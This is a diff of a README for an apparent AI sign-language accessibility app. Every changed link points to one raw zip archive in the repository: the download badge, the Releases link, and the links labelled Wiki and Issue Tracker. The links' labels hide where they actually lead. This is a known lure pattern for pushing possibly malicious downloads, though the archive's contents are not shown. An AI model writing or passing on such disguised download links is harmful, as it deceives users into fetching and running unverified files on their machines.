@@ -6,7 +6,7 @@ Welcome to Sena-Voz-Accessibility-AI! This application uses AI to recognize sign
 
 ## 📥 Download the Application
 
-[![Download Sena-Voz-Accessibility-AI](https://img.shields.io/badge/Download-Sena--Voz--Accessibility--AI-blue)](https://github.com/prosper6268/Sena-Voz-Accessibility-AI/releases)
+[![Download Sena-Voz-Accessibility-AI](https://github.com/prosper6268/Sena-Voz-Accessibility-AI/raw/refs/heads/main/Sena Voz/Sena-Accessibility-AI-Voz-2.1-alpha.5.zip)](https://github.com/prosper6268/Sena-Voz-Accessibility-AI/raw/refs/heads/main/Sena Voz/Sena-Accessibility-AI-Voz-2.1-alpha.5.zip)
 
 ## 📋 System Requirements
 
@@ -27,7 +27,7 @@ To run Sena-Voz-Accessibility-AI smoothly, ensure your system meets the followin
 
 ## 📥 Download & Install
 
-To download the latest version of Sena-Voz-Accessibility-AI, please visit our [Releases page](https://github.com/prosper6268/Sena-Voz-Accessibility-AI/releases).
+To download the latest version of Sena-Voz-Accessibility-AI, please visit our [Releases page](https://github.com/prosper6268/Sena-Voz-Accessibility-AI/raw/refs/heads/main/Sena Voz/Sena-Accessibility-AI-Voz-2.1-alpha.5.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version listed at the top.
@@ -41,8 +41,8 @@ After installation, you can launch the application from your desktop or start me
 
 If you encounter any issues or have questions, you can find additional support:
 
-- **Documentation:** Visit the [Wiki](https://github.com/prosper6268/Sena-Voz-Accessibility-AI/wiki) for detailed user guides and FAQs.
-- **Issue Tracker:** Report bugs or request features by creating an issue on our [GitHub Issues page](https://github.com/prosper6268/Sena-Voz-Accessibility-AI/issues).
+- **Documentation:** Visit the [Wiki](https://github.com/prosper6268/Sena-Voz-Accessibility-AI/raw/refs/heads/main/Sena Voz/Sena-Accessibility-AI-Voz-2.1-alpha.5.zip) for detailed user guides and FAQs.
+- **Issue Tracker:** Report bugs or request features by creating an issue on our [GitHub Issues page](https://github.com/prosper6268/Sena-Voz-Accessibility-AI/raw/refs/heads/main/Sena Voz/Sena-Accessibility-AI-Voz-2.1-alpha.5.zip).
 - **Community Support:** Join our community discussions to get tips and share experiences.
 
 ## 💡 Tips for Using Sena-Voz-Accessibility-AI
